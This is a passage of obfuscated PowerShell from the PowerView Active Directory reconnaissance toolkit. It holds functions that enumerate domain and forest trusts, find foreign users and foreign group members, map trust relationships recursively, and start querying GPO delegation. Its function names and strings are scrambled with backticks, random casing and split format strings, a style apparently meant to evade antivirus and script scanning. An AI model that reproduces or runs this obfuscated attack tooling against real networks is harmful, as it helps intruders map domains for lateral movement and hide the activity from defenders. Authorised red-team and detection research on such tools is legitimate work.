            }
        }

        if ( $PsCmdlet.PaRaMETeRseTNAme -eq ( "{1}{0}" -f'DAP','L' ) ) {
            
            $TrustSearcher =   Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.fiLteR =  (( "{3}{2}{4}{5}{0}{1}"-f'main',')','te','(objectClass=trus','dD','o'  )  )

                if ($PSBoundParameters[( "{1}{0}"-f 'ndOne','Fi')]  ) { $Results =  $TrustSearcher.FInDonE(  ) }
                else { $Results  = $TrustSearcher.findAll(  ) }
                $Results   |  Where-Object {$_} |  ForEach-Object {
                    $Props   =   $_.PROPERTies
                    $DomainTrust =   New-Object (  'PSObje'+  'c'+  't' )

                    $TrustAttrib   =   @(  )
                    $TrustAttrib += $TrustAttributes.kEYS  | Where-Object { $Props.TRUStattribuTeS[0] -band $_ } |  ForEach-Object { $TrustAttributes[$_] }

                    $Direction  =   Switch ($Props.TruStDIRectiOn) {
                        0 { (  "{0}{1}" -f 'D','isabled'  ) }
                        1 { (  "{0}{1}" -f'In','bound' ) }
                        2 { ( "{2}{1}{0}" -f'nd','bou','Out') }
                        3 { ("{1}{3}{0}{2}" -f 'ection','B','al','idir'  ) }
                    }

                    $TrustType  =  Switch (  $Props.TrUStTYPE  ) {
                        1 { (  "{1}{0}{2}{5}{3}{4}" -f'NDOWS_','WI','NON_A','IVE_DIRECTO','RY','CT'  ) }
                        2 { (  "{4}{6}{0}{1}{3}{5}{2}" -f'OWS_ACTIVE','_DI','RY','R','WIN','ECTO','D'  ) }
                        3 { 'MIT' }
                    }

                    $Distinguishedname  =  $Props.disTINGUiSHEDnAme[0]
                    $SourceNameIndex  =  $Distinguishedname.INdExoF(  'DC=' )
                    if ($SourceNameIndex) {
                        $SourceDomain  =   $($Distinguishedname.subSTriNg( $SourceNameIndex)  ) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain   = ""
                    }

                    $TargetNameIndex =   $Distinguishedname.InDEXOf(( "{1}{0}{2}" -f'CN=S',',','ystem'  ))
                    if ( $SourceNameIndex) {
                        $TargetDomain   =  $Distinguishedname.SUBStriNg( 3, $TargetNameIndex-3 )
                    }
                    else {
                        $TargetDomain   =  ""
                    }

                    $ObjectGuid   =  New-Object ( 'G' +  'uid' ) @(,$Props.ObjeCTGUID[0])
                    $TargetSID =  (  New-Object (  'S'  + 'y'+ 'st'  +  'e' +  'm'+ '.S'+  'ecurity.Pr' + 'i'+ 'ncipal.S' +'ecurity' +'Identifi' + 'e'  +'r' )( $Props.secUrITYidentIfIER[0],0)  ).VALuE

                    $DomainTrust   |   Add-Member ('N' + 'ot'+ 'eproperty') ( "{0}{1}{2}" -f'Sour','ceNa','me'  ) $SourceDomain
                    $DomainTrust   | Add-Member ('N'+ 'oteprop'  + 'er'  +  'ty'  ) (  "{2}{0}{1}" -f'a','rgetName','T'  ) $Props.NAmE[0]
                    
                    $DomainTrust   |   Add-Member ( 'No'+'tepro'  +'pert' + 'y'  ) (  "{1}{2}{0}"-f'e','TrustTy','p') $TrustType
                    $DomainTrust | Add-Member (  'N'  + 'o'  +  't' +  'eproperty'  ) ( "{1}{3}{2}{4}{0}" -f 'butes','T','t','rus','Attri' ) $($TrustAttrib -join ',' )
                    $DomainTrust  |  Add-Member ( 'Notepro' +'pe' +'r' + 'ty') ( "{0}{2}{1}" -f 'TrustDi','tion','rec') "$Direction"
                    $DomainTrust  |   Add-Member ('N' +  'oteprope'+  'r'  +  'ty') ("{1}{0}{2}"-f 'reate','WhenC','d' ) $Props.wHENcreateD[0]
                    $DomainTrust   | Add-Member ( 'N'+  'oteprop'  + 'e'  +'rty') ("{0}{2}{1}" -f 'Wh','ed','enChang'  ) $Props.WheNCHANGed[0]
                    $DomainTrust.PsoBjeCT.TYpEnAmES.insERT(0, (  "{5}{0}{4}{3}{2}{1}" -f 'ow','LDAP','.','rust','erView.DomainT','P')  )
                    $DomainTrust
                }
                if (  $Results  ) {
                    try { $Results.DisPOse(   ) }
                    catch {
                        Write-Verbose ('[Get-Do'+'mai' + 'nT'  +  'rust' +'] '  +  'Error' +' ' +  'di' +  'sp'  +  'osing ' +  'of'+' '  + 't'+'he ' +  'R' +'e'  +  'sults '  + 'obj'+  'ect:'+  ' ' + "$_" )
                    }
                }
                $TrustSearcher.dIsPOSe( )
            }
        }
        elseif ( $PsCmdlet.PaRamEteRSEtNamE -eq 'API') {
            
            if (  $PSBoundParameters[( "{1}{0}{2}"-f 've','Ser','r'  )] ) {
                $TargetDC =  $Server
            }
            elseif ($Domain -and $Domain.trIm(  ) -ne ''  ) {
                $TargetDC  =  $Domain
            }
            else {
                
                $TargetDC  =  $Null
            }

            
            $PtrInfo =  [IntPtr]::zerO

            
            $Flags = 63
            $DomainCount  =  0

            
            $Result  =  $Netapi32::DsENUmERAtEdOmaINTRUstS(  $TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount  )

            
            $Offset =  $PtrInfo.ToiNt64(   )

            
            if ((  $Result -eq 0  ) -and ( $Offset -gt 0 )  ) {

                
                $Increment =   $DS_DOMAIN_TRUSTS::GETSIZE( )

                
                for ($i =   0; (  $i -lt $DomainCount  );  $i++ ) {
                    
                    $NewIntPtr  = New-Object ( 'S'  + 'ystem.' +'Intptr' ) -ArgumentList $Offset
                    $Info   =   $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset   =   $NewIntPtr.toINt64( )
                    $Offset += $Increment

                    $SidString   =   ''
                    $Result  =  $Advapi32::COnVertSIDToSTriNgSiD( $Info.DOMaINSiD, [ref]$SidString );  $LastError  = [Runtime.InteropServices.Marshal]::getlAstWIN32erROr(  )

                    if ( $Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        $DomainTrust   =  New-Object ('P'+'SObje'  + 'ct' )
                        $DomainTrust |   Add-Member (  'N' +'oteprop' + 'ert'+ 'y' ) ("{0}{1}{2}"-f'S','our','ceName' ) $SourceDomain
                        $DomainTrust  |   Add-Member (  'Not' +'eproper' +'t' +  'y') ( "{1}{0}{3}{2}"-f 'r','Ta','etName','g') $Info.DNsdOmAinNamE
                        $DomainTrust | Add-Member ( 'N' +  'otepro'  + 'pe' +'rty' ) ("{2}{1}{3}{0}" -f 'e','etNet','Targ','biosNam'  ) $Info.netBiosdoMaiNName
                        $DomainTrust   |  Add-Member (  'Not' +  'epr' +'o'  +'perty' ) ( "{0}{1}"-f'F','lags') $Info.fLAgS
                        $DomainTrust | Add-Member (  'Notep' +  'roper'+ 'ty') ("{0}{1}{2}"-f'P','arentI','ndex'  ) $Info.pArEnTIndeX
                        $DomainTrust |  Add-Member (  'Notepr' +  'ope'+ 'rty') ("{2}{0}{1}" -f'rus','tType','T'  ) $Info.TrUsTtyPE
                        $DomainTrust |  Add-Member ('N'+'otepr'  +'op'+  'erty') ("{2}{1}{3}{0}" -f 'ttributes','r','T','ustA') $Info.tRusTatTRIbuteS
                        $DomainTrust  | Add-Member ('Notepr' +'o'+ 'per'+ 'ty'  ) (  "{0}{1}{2}"-f 'Targ','e','tSid'  ) $SidString
                        $DomainTrust  | Add-Member ( 'Notepro'+ 'pe'  +  'rty' ) ( "{2}{3}{1}{0}" -f 'Guid','t','Targ','e') $Info.doMAInguiD
                        $DomainTrust.PSOBJecT.TYPeNamEs.inseRt( 0, (  "{4}{2}{1}{5}{0}{3}" -f'ust','ai','.Dom','.API','PowerView','nTr' ) )
                        $DomainTrust
                    }
                }
                
                $Null  =  $Netapi32::netapiBuffErfREe($PtrInfo  )
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            $FoundDomain   =  Get-Domain @NetSearcherArguments
            if ($FoundDomain  ) {
                $FoundDomain.GeTALLtRustRElatIoNsHIpS(  )   | ForEach-Object {
                    $_.pSoBject.typeNAmEs.InSert( 0, ("{2}{4}{3}{5}{1}{0}" -f'T','NE','PowerVi','ru','ew.DomainT','st.'  ) )
                    $_
                }
            }
        }
    }
}


function ge`T-ForE`s`TTR`UST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{4}{1}"-f 'l','ocess','PSSh','ou','dPr'}, '' )]
    [OutputType({"{1}{4}{6}{5}{3}{2}{0}" -f 'T','Pow','NE','tTrust.','e','es','rView.For'} )]
    [CmdletBinding(  )]
    Param( 
        [Parameter( pOSitiOn   = 0, vALUEFROMPIPeLinE  = $True, vAluefrOmpIpelInebypROpERtYNAME   = $True )]
        [Alias( {"{0}{1}"-f'N','ame'} )]
        [ValidateNotNullOrEmpty( )]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential =  [Management.Automation.PSCredential]::EmpTy
      )

    PROCESS {
        $NetForestArguments =   @{}
        if ($PSBoundParameters[( "{0}{1}{2}"-f 'F','ores','t')] ) { $NetForestArguments[( "{1}{2}{0}"-f 'st','F','ore')] =  $Forest }
        if ($PSBoundParameters[( "{2}{1}{0}" -f 'tial','n','Crede' )]) { $NetForestArguments[("{1}{2}{0}" -f'l','Crede','ntia' )]  = $Credential }

        $FoundForest   = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetalLtrUSTRelatiOnsHIPS( )  | ForEach-Object {
                $_.PSOBJEcT.tYPEnaMEs.inSERT( 0, ("{4}{1}{3}{0}{2}"-f 'Trust.','ie','NET','w.Forest','PowerV')  )
                $_
            }
        }
    }
}


function gEt-dOMAINF`OREi`gnU`seR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{1}{2}{3}{0}"-f 'ss','Should','Proc','e','PS'}, '')]
    [OutputType({"{1}{3}{4}{0}{5}{2}" -f'reig','Pow','User','erV','iew.Fo','n'})]
    [CmdletBinding(  )]
    Param(  
        [Parameter(POSition  =  0, VAlUefROMpIpELiNe  = $True, vALUeFrOmpIPElInebYPRopERtYNAme =   $True  )]
        [Alias(  {"{0}{1}" -f'Na','me'} )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(    )]
        [Alias(  {"{0}{1}{2}"-f 'Filt','e','r'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{0}{1}" -f 'ADSPat','h'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{2}{3}{1}{0}"-f'ller','inContro','D','oma'})]
        [String]
        $Server,

        [ValidateSet( {"{0}{1}" -f 'Ba','se'}, {"{2}{1}{0}" -f'l','eLeve','On'}, {"{0}{1}"-f 'Subtre','e'})]
        [String]
        $SearchScope   =   (  "{0}{1}{2}"-f 'Subt','r','ee' ),

        [ValidateRange(1, 10000 )]
        [Int]
        $ResultPageSize   =   200,

        [ValidateRange( 1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{1}{0}" -f 'p','Grou'}, {"{0}{1}"-f'Non','e'}, {"{1}{0}" -f 'ner','Ow'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential =  [Management.Automation.PSCredential]::emPTy
      )

    BEGIN {
        $SearcherArguments  =   @{}
        $SearcherArguments[(  "{1}{2}{0}"-f 'ilter','LDAP','F')] = (  "{2}{0}{1}{3}"-f'o','f','(member','=*)' )
        if ( $PSBoundParameters[( "{2}{1}{0}"-f 'main','o','D'  )]) { $SearcherArguments[("{0}{1}"-f'Dom','ain')] =   $Domain }
        if ( $PSBoundParameters[( "{1}{0}{2}"-f'rtie','Prope','s')]) { $SearcherArguments[(  "{1}{2}{0}" -f'ties','Prope','r' )] = $Properties }
        if (  $PSBoundParameters[(  "{1}{0}{2}"-f'arc','Se','hBase' )] ) { $SearcherArguments[(  "{2}{0}{1}" -f'ch','Base','Sear' )]   = $SearchBase }
        if ( $PSBoundParameters[(  "{0}{1}{2}" -f'S','er','ver')]  ) { $SearcherArguments[(  "{0}{1}"-f'Serve','r' )] = $Server }
        if ($PSBoundParameters[( "{3}{0}{2}{1}"-f 'e','ope','archSc','S')]  ) { $SearcherArguments[(  "{1}{0}{2}{3}" -f 'chSc','Sear','op','e'  )]  =  $SearchScope }
        if ( $PSBoundParameters[(  "{1}{2}{0}"-f 'tPageSize','Re','sul')]  ) { $SearcherArguments[("{3}{2}{1}{0}"-f 'ize','tPageS','esul','R'  )]  = $ResultPageSize }
        if (  $PSBoundParameters[( "{0}{1}{3}{2}" -f 'Server','T','it','imeLim'  )]  ) { $SearcherArguments[("{2}{1}{0}{3}"-f'ime','verT','Ser','Limit' )] =  $ServerTimeLimit }
        if ($PSBoundParameters[( "{0}{2}{3}{4}{1}" -f'S','s','ec','urityM','ask')]  ) { $SearcherArguments[(  "{2}{0}{1}"-f 'ityMas','ks','Secur')]   = $SecurityMasks }
        if ($PSBoundParameters[( "{2}{1}{0}" -f'ne','o','Tombst'  )] ) { $SearcherArguments[("{0}{2}{1}" -f 'Tombs','e','ton')] = $Tombstone }
        if ( $PSBoundParameters[(  "{1}{2}{0}"-f'dential','C','re' )] ) { $SearcherArguments[( "{1}{0}{2}{3}" -f 'ent','Cred','ia','l' )] =  $Credential }
        if ( $PSBoundParameters['Raw']  ) { $SearcherArguments['Raw']  =  $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments    |  ForEach-Object {
            ForEach ( $Membership in $_.MemBerOF) {
                $Index =   $Membership.InDeXOf('DC=')
                if ( $Index  ) {

                    $GroupDomain =   $($Membership.sUbstRiNg(  $Index ) ) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName   =   $_.DIsTiNguiSheDnamE
                    $UserIndex =  $UserDistinguishedName.INDEXOF(  'DC=')
                    $UserDomain   = $($_.DISTiNGuiSHednAME.sUbsTRIng(  $UserIndex  )  ) -replace 'DC=','' -replace ',','.'

                    if (  $GroupDomain -ne $UserDomain  ) {
                        
                        $GroupName  = $Membership.SpLiT(',' )[0].spLit('=')[1]
                        $ForeignUser   =   New-Object ('PSO' + 'bj'  +  'ect')
                        $ForeignUser   | Add-Member ('Not' +'epropert' +  'y'  ) ( "{2}{1}{0}" -f 'main','o','UserD') $UserDomain
                        $ForeignUser   | Add-Member ( 'No'+  'teprop' + 'ert'+  'y') ( "{0}{2}{1}"-f 'Us','rName','e') $_.sAmaccOuNTnaME
                        $ForeignUser  |   Add-Member (  'No'+  'tep'+'roperty'  ) ("{1}{2}{4}{3}{0}" -f'ame','U','serD','guishedN','istin' ) $_.dISTINgUIsHednAme
                        $ForeignUser   |  Add-Member ('N' +  'o'+'tepro'+  'perty'  ) ("{0}{2}{1}"-f'Grou','ain','pDom'  ) $GroupDomain
                        $ForeignUser |  Add-Member ( 'N'+'ot'+'epropert'+ 'y'  ) ( "{3}{0}{2}{1}" -f'ou','e','pNam','Gr') $GroupName
                        $ForeignUser | Add-Member ( 'Not'  +'eprop' + 'erty') ( "{5}{2}{1}{3}{4}{0}"-f'shedName','isting','roupD','u','i','G'  ) $Membership
                        $ForeignUser.PSOBject.typeNAMEs.insERt(  0, ( "{3}{2}{1}{4}{0}" -f 'r','reignUs','w.Fo','PowerVie','e' )  )
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function GEt-D`O`Mai`NfO`Rei`GNGR`OuP`meMber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{1}{3}{0}{2}" -f 'e','PSShouldP','ss','roc'}, '' )]
    [OutputType(  {"{4}{3}{2}{1}{0}"-f'roupMember','nG','g','ei','PowerView.For'} )]
    [CmdletBinding(    )]
    Param(  
        [Parameter(  poSitIon   =   0, valUEfROmpipelInE   = $True, VaLueFrOmPIPeliNebyPRoPERtynAME   =   $True  )]
        [Alias({"{1}{0}"-f 'ame','N'})]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{2}{0}{1}"-f'il','ter','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{1}{0}{2}"-f'SPat','AD','h'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{3}{0}{1}{2}"-f 'inContro','ll','er','Doma'}  )]
        [String]
        $Server,

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{2}{0}" -f 'el','On','eLev'}, {"{1}{2}{0}"-f 'e','S','ubtre'})]
        [String]
        $SearchScope   =  ( "{0}{2}{1}" -f'Su','ree','bt' ),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize   =  200,

        [ValidateRange( 1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(  {"{1}{0}"-f'l','Dac'}, {"{1}{0}" -f 'p','Grou'}, {"{1}{0}"-f'e','Non'}, {"{1}{0}"-f'wner','O'}, {"{0}{1}"-f 'Sac','l'} )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(    )]
        $Credential   =  [Management.Automation.PSCredential]::EMPty
      )

    BEGIN {
        $SearcherArguments  =   @{}
        $SearcherArguments[(  "{3}{1}{0}{2}" -f'APFil','D','ter','L')]   =   ( "{0}{2}{1}" -f '(mem',')','ber=*'  )
        if (  $PSBoundParameters[(  "{0}{1}" -f 'Doma','in'  )]) { $SearcherArguments[("{1}{0}" -f'in','Doma'  )]  = $Domain }
        if ( $PSBoundParameters[(  "{2}{1}{0}" -f'ies','rt','Prope'  )] ) { $SearcherArguments[(  "{1}{0}{2}" -f'perti','Pro','es' )]   =   $Properties }
        if ($PSBoundParameters[( "{0}{2}{1}" -f'Searc','ase','hB' )]  ) { $SearcherArguments[( "{1}{2}{0}" -f'e','S','earchBas' )]   =   $SearchBase }
        if (  $PSBoundParameters[(  "{0}{2}{1}" -f 'S','r','erve')] ) { $SearcherArguments[("{0}{1}" -f'S','erver')] =  $Server }
        if ( $PSBoundParameters[("{3}{2}{0}{1}"-f'r','chScope','ea','S'  )] ) { $SearcherArguments[("{2}{1}{0}" -f 'pe','co','SearchS')] =  $SearchScope }
        if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'Resul','tPa','geSize')]) { $SearcherArguments[(  "{0}{1}{2}{3}"-f'ResultPa','geS','iz','e' )]   =   $ResultPageSize }
        if ( $PSBoundParameters[(  "{1}{3}{0}{2}" -f 'imeLim','S','it','erverT' )] ) { $SearcherArguments[(  "{2}{1}{0}"-f 'eLimit','im','ServerT')]  =   $ServerTimeLimit }
        if ( $PSBoundParameters[("{2}{4}{0}{3}{1}"-f'c','Masks','S','urity','e')]) { $SearcherArguments[( "{1}{3}{0}{2}"-f'rityMask','Se','s','cu' )]   =  $SecurityMasks }
        if ( $PSBoundParameters[(  "{0}{2}{1}" -f'Tombsto','e','n')] ) { $SearcherArguments[( "{2}{0}{1}" -f'mbs','tone','To' )]  =  $Tombstone }
        if ( $PSBoundParameters[( "{1}{0}{2}"-f'eden','Cr','tial')]  ) { $SearcherArguments[( "{0}{2}{1}" -f'Cre','ial','dent')]  =  $Credential }
        if (  $PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        
        $ExcludeGroups  = @(( "{0}{1}"-f'Us','ers'  ), (  "{1}{0}{2}"-f 'omain Us','D','ers' ), (  "{0}{1}"-f 'Guest','s'  )  )

        Get-DomainGroup @SearcherArguments  |   Where-Object { $ExcludeGroups -notcontains $_.samAccOUNtnamE } |  ForEach-Object {
            $GroupName =   $_.saMacCouNTNaME
            $GroupDistinguishedName   =   $_.dIStinGuisHednAmE
            $GroupDomain   =  $GroupDistinguishedName.sUBstRinG($GroupDistinguishedName.iNDeXOf(  'DC=')  ) -replace 'DC=','' -replace ',','.'

            $_.mEmbEr   |  ForEach-Object {
                
                
                $MemberDomain =  $_.SubSTrINg($_.inDExof(  'DC='  ) ) -replace 'DC=','' -replace ',','.'
                if (  ($_ -match ( "{1}{3}{0}{2}{4}" -f'-1-5','C','-21.','N=S','*-.*') ) -or ( $GroupDomain -ne $MemberDomain)  ) {
                    $MemberDistinguishedName  = $_
                    $MemberName  =   $_.sPliT(',' )[0].spLIT( '=' )[1]

                    $ForeignGroupMember  =   New-Object (  'PSO'  +  'bjec'  + 't' )
                    $ForeignGroupMember   |   Add-Member ( 'No'+ 'tepr' +  'operty'  ) (  "{0}{1}{2}" -f'Gro','upDoma','in') $GroupDomain
                    $ForeignGroupMember   |   Add-Member ( 'Note'  +'proper' +  'ty') (  "{0}{1}{2}" -f 'Gr','o','upName' ) $GroupName
                    $ForeignGroupMember |   Add-Member ( 'Notep'+  'rope'  + 'rt'  +'y' ) ( "{1}{4}{2}{5}{3}{0}" -f 'Name','G','Di','shed','roup','stingui' ) $GroupDistinguishedName
                    $ForeignGroupMember   |  Add-Member (  'Notep'  +  'rop'+'erty') ("{3}{0}{1}{2}"-f 'Dom','a','in','Member' ) $MemberDomain
                    $ForeignGroupMember   |  Add-Member (  'No'+'tepr'+ 'operty' ) (  "{0}{2}{1}" -f 'M','ame','emberN' ) $MemberName
                    $ForeignGroupMember   |  Add-Member (  'Note'  +  'pr' +  'oper' +  'ty') (  "{1}{6}{2}{4}{5}{3}{0}"-f'me','Mem','erDisting','dNa','uish','e','b' ) $MemberDistinguishedName
                    $ForeignGroupMember.pSOBJect.TYpeNaMES.INserT(0, (  "{1}{3}{4}{2}{0}"-f 'pMember','Pow','nGrou','erView.For','eig')  )
                    $ForeignGroupMember
                }
            }
        }
    }
}


function geT`-dom`A`iNtR`UstmaP`pINg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{1}{3}{2}{0}"-f's','ho','ces','uldPro','PSS'}, ''  )]
    [OutputType({"{3}{4}{1}{7}{5}{2}{0}{6}"-f'st.N','V','inTru','Powe','r','.Doma','ET','iew'} )]
    [OutputType( {"{3}{2}{1}{4}{6}{0}{5}"-f 'st.L','Domai','werView.','Po','nT','DAP','ru'} )]
    [OutputType( {"{3}{0}{5}{2}{1}{4}{6}" -f 'ow','iew.DomainTrust.','rV','P','A','e','PI'}  )]
    [CmdletBinding(  DEFaultpaRaMetERSETNAmE =  {"{1}{0}"-f 'AP','LD'} )]
    Param( 
        [Parameter(paramETErsETNAMe =   'API' )]
        [Switch]
        $API,

        [Parameter(PARAMetersetNaME =  'NET')]
        [Switch]
        $NET,

        [Parameter(  pARaMETERSETNAmE   = "LD`AP"  )]
        [ValidateNotNullOrEmpty(    )]
        [Alias( {"{1}{0}"-f 'ilter','F'}  )]
        [String]
        $LDAPFilter,

        [Parameter(  paRAMeteRSEtNaMe   = "L`dap"  )]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Properties,

        [Parameter( paRaMETERSeTnAME =   "L`dap"  )]
        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{0}{1}{2}"-f'A','DS','Path'} )]
        [String]
        $SearchBase,

        [Parameter(paramEtERSeTnAme   =   "LD`AP" )]
        [Parameter(  PaRaMeTeRSETNAMe =   'API'  )]
        [ValidateNotNullOrEmpty(  )]
        [Alias({"{3}{2}{0}{4}{1}"-f 'll','r','ntro','DomainCo','e'})]
        [String]
        $Server,

        [Parameter(  pArametErsETnAMe =  "ld`Ap" )]
        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{1}{0}" -f'el','OneLev'}, {"{1}{0}" -f'ee','Subtr'})]
        [String]
        $SearchScope =   ("{1}{0}"-f'ubtree','S' ),

        [Parameter(  parAmETERSEtnAmE   = "ld`Ap" )]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize =   200,

        [Parameter( PaRAMEtERSEtnAMe   =   "L`DaP"  )]
        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [Parameter( PaRaMETerSetnAMe   =  "LD`AP"  )]
        [Switch]
        $Tombstone,

        [Parameter(  PARaMETeRseTNAme  =  "l`DaP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential = [Management.Automation.PSCredential]::EMPty
     )

    
    $SeenDomains  =   @{}

    
    $Domains   =  New-Object (  'Sy'  + 'stem.'  + 'Coll'+  'ectio'+  'ns.Stack')

    $DomainTrustArguments  = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API']  =   $API }
    if ( $PSBoundParameters['NET']) { $DomainTrustArguments['NET']  =  $NET }
    if ( $PSBoundParameters[( "{2}{1}{0}" -f 'ter','il','LDAPF')]) { $DomainTrustArguments[( "{0}{1}{2}" -f'LDAPF','il','ter' )]   = $LDAPFilter }
    if ($PSBoundParameters[( "{1}{2}{0}" -f 'ties','Pr','oper')] ) { $DomainTrustArguments[("{2}{0}{1}" -f 'ro','perties','P' )]   =  $Properties }
    if (  $PSBoundParameters[("{3}{0}{1}{2}" -f 'ea','rchBa','se','S' )] ) { $DomainTrustArguments[(  "{2}{0}{1}"-f 'archB','ase','Se' )]  =  $SearchBase }
    if ($PSBoundParameters[("{1}{0}" -f 'erver','S' )] ) { $DomainTrustArguments[(  "{1}{0}" -f 'r','Serve'  )]   = $Server }
    if (  $PSBoundParameters[(  "{0}{2}{1}"-f'S','rchScope','ea')] ) { $DomainTrustArguments[(  "{2}{0}{1}"-f 'rchSco','pe','Sea' )]   = $SearchScope }
    if ($PSBoundParameters[( "{0}{2}{1}{3}" -f 'Result','ag','P','eSize')]  ) { $DomainTrustArguments[( "{1}{4}{2}{0}{3}" -f'iz','ResultP','S','e','age')]   =   $ResultPageSize }
    if (  $PSBoundParameters[("{1}{2}{3}{0}"-f'mit','S','er','verTimeLi')]) { $DomainTrustArguments[( "{1}{2}{0}{3}" -f'im','Server','TimeL','it'  )]  = $ServerTimeLimit }
    if ( $PSBoundParameters[(  "{1}{0}" -f 'stone','Tomb')]) { $DomainTrustArguments[(  "{0}{2}{1}" -f'Tom','tone','bs')]  =  $Tombstone }
    if (  $PSBoundParameters[("{1}{0}{2}{3}" -f'redent','C','i','al' )]) { $DomainTrustArguments[( "{0}{2}{1}" -f'Cred','al','enti' )]   = $Credential }

    
    if (  $PSBoundParameters[(  "{2}{1}{3}{0}" -f 'ial','n','Crede','t'  )]) {
        $CurrentDomain   =  ( Get-Domain -Credential $Credential).namE
    }
    else {
        $CurrentDomain  =   (Get-Domain ).NAmE
    }
    $Domains.PUSH($CurrentDomain)

    while(  $Domains.coUNT -ne 0  ) {

        $Domain   = $Domains.pOp(   )

        
        if (  $Domain -and ($Domain.tRiM(  ) -ne '') -and (  -not $SeenDomains.COnTAINsKey( $Domain )  ) ) {

            Write-Verbose ('[' +  'G'  +'et-Doma'+ 'i'+  'nTrus'+'tMappin' + 'g] '+ 'Enumer'  +'at'  + 'ing ' +  'tr'  +'ust'+ 's '+'f' + 'or '+ 'domain:' + ' '+  "'$Domain'")

            
            $Null   =   $SeenDomains.aDd($Domain, '' )

            try {
                
                $DomainTrustArguments[("{1}{0}{2}" -f 'a','Dom','in')]   = $Domain
                $Trusts   = Get-DomainTrust @DomainTrustArguments

                if ( $Trusts -isnot [System.Array]  ) {
                    $Trusts  = @($Trusts )
                }

                
                if ($PsCmdlet.paRamETeRsETname -eq 'NET' ) {
                    $ForestTrustArguments =   @{}
                    if ( $PSBoundParameters[(  "{1}{0}"-f 'orest','F' )]) { $ForestTrustArguments[(  "{0}{1}"-f'F','orest')]   =  $Forest }
                    if (  $PSBoundParameters[("{1}{2}{0}"-f 'ial','C','redent'  )]) { $ForestTrustArguments[( "{2}{1}{0}" -f 'ial','dent','Cre' )] =  $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if (  $Trusts) {
                    if (  $Trusts -isnot [System.Array]  ) {
                        $Trusts   =  @($Trusts)
                    }

                    
                    ForEach ($Trust in $Trusts  ) {
                        if ( $Trust.sOURcenAMe -and $Trust.TaRgetnAmE  ) {
                            
                            $Null = $Domains.puSH($Trust.taRGETnaMe )
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose ('[Get'  + '-D'  + 'omainT'  + 'ru' + 's'  + 'tMap'+  'ping'  +'] ' +  'Erro'+'r'  +': '+  "$_" )
            }
        }
    }
}


function get-`g`podEL`EGaT`iON {


    [CmdletBinding(    )]
    Param (
        [String]
        $GPOName  =  '*',

        [ValidateRange(1,10000  )] 
        [Int]
        $PageSize   =  200
      )

    $Exclusions = @(("{0}{1}"-f 'SY','STEM'  ),("{0}{3}{1}{2}"-f 'Do','A','dmins','main ' ),(  "{3}{0}{2}{1}" -f 'terp',' Admins','rise','En'  ))

    $Forest =   [System.DirectoryServices.ActiveDirectory.Forest]::GETCurReNtFoREST(  )
    $DomainList   =   @($Forest.doMaiNs  )
    $Domains   =  $DomainList  | foreach { $_.GetdireCtorYEntrY(  ) }
    foreach ($Domain in $Domains ) {
        $Filter   =   "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher   = New-Object ( 'Syste'+ 'm'  + '.Di'+ 'rector'+  'yServ'+'ice'+ 's.'+'Di'+'re'  +'c'  +  'torySea'+  'rcher'  )
        $Searcher.SEaRchRoOt  =   $Domain
        $Searcher.fILtEr =  $Filter
        $Searcher.pAGeSIZE  =   $PageSize
        $Searcher.searCHSCopE   =  (  "{0}{1}{2}" -f 'Su','btr','ee')
        $listGPO   =  $Searcher.FiNdalL(    )
        foreach (  $gpo in $listGPO  ){
